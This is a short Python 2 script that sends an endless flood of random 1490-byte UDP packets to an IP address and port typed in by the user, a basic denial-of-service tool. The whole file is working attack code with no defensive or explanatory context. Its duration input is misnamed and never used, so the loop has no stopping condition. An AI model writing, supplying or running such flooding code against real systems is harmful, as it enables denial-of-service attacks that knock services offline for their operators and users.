import socket
import random
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1490)

ip = raw_input(' IP of the target: ')
port = input('Port to attack : ')
duration = input('Number of packets to send : ')
timeout = time.time() + duration
sent = 0

while True:
        sock.sendto(bytes,(ip,port))
        sent = sent + 1
        print "Sent %s packet to %s throught port %s"%(sent, ip, port)
